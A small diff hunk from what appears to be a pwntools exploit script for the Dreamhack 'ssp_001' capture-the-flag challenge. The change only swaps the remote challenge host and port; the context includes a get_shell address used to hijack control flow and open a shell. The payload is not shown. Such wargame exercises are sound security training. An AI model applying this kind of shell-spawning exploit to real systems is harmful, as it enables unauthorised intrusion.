@@ -4,7 +4,7 @@ context.log_level       = "DEBUG"
 context.arch            = "amd64"
 
 #p = process("./ssp_001")
-p = remote("host3.dreamhack.games", 19965)
+p = remote("host2.dreamhack.games", 16377)
 #gdb.attach(p,api=True)
 
 get_shell = 0x080486b9
